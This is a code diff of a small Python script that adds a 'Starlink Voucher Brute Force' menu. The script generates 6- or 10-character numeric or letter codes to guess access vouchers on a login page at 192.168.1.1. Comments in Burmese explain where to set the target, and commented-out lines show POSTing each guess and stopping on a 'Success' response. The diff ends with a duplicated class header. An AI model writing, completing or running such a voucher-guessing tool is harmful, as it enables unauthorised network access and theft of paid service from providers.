@@ -1,18 +1,17 @@
 import os
 import time
 import random
-import uuid
 import sys
-import threading
 import requests
-import webbrowser
-from urllib.parse import urlparse, parse_qs
 
 class LOD_V32_FIXED:
     def __init__(self):
         self.is_running = False
+        # Starlink login page url ကို ဒီမှာ ထည့်ပါ
+        self.target_url = "http://192.168.1.1" 
 
     def brute_force_engine(self):
+        print("--- Starlink Voucher Brute Force ---")
         print("[1] 6 လုံး (Number)")
         print("[2] 10 လုံး (Number)")
         print("[3] 6 လုံး (English)")
@@ -31,15 +30,18 @@ class LOD_V32_FIXED:
                 break
             
             print(f"Testing: {code}")
+            
+            # Code မှန်မမှန်စစ်ရန် (Target ဝဘ်ဆိုက်ပေါ်မူတည်ပြီး ပြင်ပေးရပါမယ်)
+            # response = requests.post(self.target_url, data={'code': code})
+            # if "Success" in response.text:
+            #     print(f"[*] Found: {code}")
+            #     break
+            
             time.sleep(0.1)
 
 if __name__ == "__main__":
     app = LOD_V32_FIXED()
     app.brute_force_engine()
-
-
-
-
 
 class LOD_V32_FIXED:
     def __init__(self):
